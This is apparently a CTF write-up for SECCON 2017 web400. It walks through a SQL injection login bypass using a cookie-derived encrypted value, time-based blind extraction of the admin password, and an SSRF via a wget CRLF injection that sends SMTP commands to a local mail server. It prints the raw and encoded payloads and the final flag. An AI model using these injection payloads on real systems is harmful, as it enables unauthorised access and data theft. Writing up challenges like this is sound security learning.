Hello guys , so as always i will share me and my team solution for web400 

First , i would like to thanks all orgz for this ctf , really enjoyed and make me work hard to solve this and others web and crypto challenge

So this task was in first stage simple login form and source code of index.cgi page 

![login](https://user-images.githubusercontent.com/7364615/33808035-018600f8-dde0-11e7-8041-59ca86648b99.PNG)

And this is source code , the best part the sql query 

![source_code](https://user-images.githubusercontent.com/7364615/33808043-294d5866-dde0-11e7-9ff2-eed10fea701e.png)

So what here we can do is inject our payload using username , we can't use password first because its not in the query 
and second it was encrypted with unknown cipher

Lets break this login by just using 'union select'

payload :  "union select 'admin'--"

but wait ? our password is encrypted before the check 

```
$row[0] eq &encrypt($q->param('pass'))
```

So how we can make this true and login ? , lets audit more the code and look for our hope :D 
```
($q->param('save') eq '1' ? $q->cookie(-name=>'remember', -value=>&encrypt($user), -expires=>'+1M') : undef)
```

So if we check the Remember Me option we will get our username used to login encrypted into remember cookie 

Okay , lets try with username : admin and password :anything 

![image](https://user-images.githubusercontent.com/7364615/33808116-3b700182-dde1-11e7-960d-a8f5c7d80c97.png)

This is username (admin) encrypted , lets use it in the payload to make the check True 

```
username : 'union select '58474452dda5c2bdc1f6869ace2ae9e3
password : admin
```

Oh we are in now :D 

![image](https://user-images.githubusercontent.com/7364615/33808129-6f7c57c8-dde1-11e7-953f-ee43da1e672b.png)

But "* No.2 is only for "admin" user." :(

Need to login with admin , so we need to get the real password from database 'SQLite' 

Using this https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet to help me make thinks easier

So lets try "Time-based data extraction"

So what i did first is figure out the time for True and False query 

Here when query True : Time = 1.37

![delay1](https://user-images.githubusercontent.com/7364615/33808192-77963e78-dde2-11e7-8daa-21cb07378e11.PNG)

And when query False Time = 500 ms

![delay2](https://user-images.githubusercontent.com/7364615/33808193-7a36cbfc-dde2-11e7-82bd-76e5c42371ca.PNG)

Then start code to make it fast and easy 

This is my script : [Script](https://github.com/chamli/Write_Up_Ctf/blob/master/SECCON_2017/web400.py)

Just decrease the time in the script due to some problem , so its depend 

Then after the script end it print for us the password 
```
password : Yes!Kusomon!!
```

Login as Admin like a BOSS :D 

Next stage , as the name of Task it will be "SSRF"

Like we see here 

![image](https://user-images.githubusercontent.com/7364615/33808245-634ca9a6-dde3-11e7-8ac4-ae2be598554a.png)

port 25 is open only in local 

With the help of orange bugs again :D 

https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html

Make me exploit it fast and without wasting time , using CRLF will break this and finish this stage 

So my last payload was 

```
127.0.0.1
HELO admin
MAIL FROM:<myemail@gmail.com>
RCPT TO:<root@ymzk01.pwn>
DATA
From:myemail@gmail.com
To:root@ymzk01.pwn
Subject:give me flag
give me flag
.
QUIT
:25/
```

Then encode it to bypass some problem

```
127.0.0.1%0D%0AHELO%20admin%0D%0AMAIL%20FROM%3A%3Cmyemail%40gmail.com%3E%0D%0ARCPT%20TO%3A%3Croot%40ymzk01.pwn%3E%0D%0ADATA%0D%0AFrom%3Amyemail%40gmail.com%0D%0ATo%3Aroot%40ymzk01.pwn%0D%0ASubject%3Agive%20me%20flag%0D%0Agive%20me%20flag%0D%0A.%0D%0AQUIT%0D%0A%:25/
```

And again break this stage and Get our email 


![image](https://user-images.githubusercontent.com/7364615/33808286-f960ec40-dde3-11e7-8f41-dbdda389ed18.png)

Use the cookie to decrypt our flag :D 

![image](https://user-images.githubusercontent.com/7364615/33808293-1567d23c-dde4-11e7-8ce3-ed401edcf0d9.png)

```
SECCON{SSRFisMyFriend!}
```

